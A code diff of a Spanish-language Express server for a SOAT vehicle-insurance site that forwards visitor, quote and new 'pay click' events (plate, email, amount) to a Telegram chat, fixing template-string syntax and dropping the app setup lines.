@@ -1,38 +1,35 @@
-const express = require('express');
-const bodyParser = require('body-parser');
-const axios = require('axios');
-const cors = require('cors');
-
-const app = express();
-app.use(cors());
-app.use(bodyParser.json());
-
-const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-
 app.post('/notificar', async (req, res) => {
   const datos = req.body;
 
   let mensaje = "";
 
-  // 🚨 Mensaje para visita simple al sitio
+  // 👀 Visita al sitio
   if (datos.tipo === "visita") {
     mensaje = "👀 *Nuevo visitante ingresó al sitio*";
 
-  // 📊 Mensaje para cotización (cuando presionan el botón "Cotizar")
+  // 📊 Cotización
   } else if (datos.tipo === "cotizacion") {
-    mensaje = 
+    mensaje = `
 📊 *Nueva cotización de SOAT:*
 🚗 *Placa:* ${datos.placa || 'No proporcionada'}
 📄 *Clase:* ${datos.clase || 'N/A'}
 📌 *Subtipo:* ${datos.subtipo || 'N/A'}
 🎂 *Edad vehículo:* ${datos.edad || 'N/A'}
 💰 *Valor estimado:* ${datos.valor || '$0'}
-.trim();
+`.trim();
 
-  // 📥 Mensaje completo al enviar el formulario
+  // 🟡 Clic en Pagar (nuevo)
+  } else if (datos.tipo === "pago") {
+    mensaje = `
+🟡 *Clic en Pagar*
+📧 Correo: ${datos.correo || 'N/A'}
+🚗 Placa: ${datos.placa || 'N/A'}
+💵 Valor: ${datos.valor || '$0'}
+`.trim();
+
+  // 📥 Envío de formulario completo
   } else {
-    mensaje = 
+    mensaje = `
 📥 *Nueva solicitud de SOAT*:
 🚗 *Placa:* ${datos.placa || 'No proporcionada'}
 💵 *Valor estimado:* ${datos.valor || '$0'}
@@ -53,11 +50,11 @@ app.post('/notificar', async (req, res) => {
 🧾 *Clase:* ${datos.clase || 'N/A'}
 📌 *Subtipo:* ${datos.subtipo || 'N/A'}
 🎂 *Edad vehículo:* ${datos.edad || 'N/A'}
-.trim();
+`.trim();
   }
 
   try {
-    await axios.post(https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage, {
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: mensaje,
       parse_mode: "Markdown"
@@ -68,13 +65,4 @@ app.post('/notificar', async (req, res) => {
     console.error('❌ Error enviando a Telegram:', error.message);
     res.status(500).json({ ok: false, msg: 'Error enviando a Telegram' });
   }
-});
-
-app.get('/', (req, res) => {
-  res.send('Servidor de notificación SOAT funcionando 🚀');
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(Servidor corriendo en el puerto ${PORT});
 });
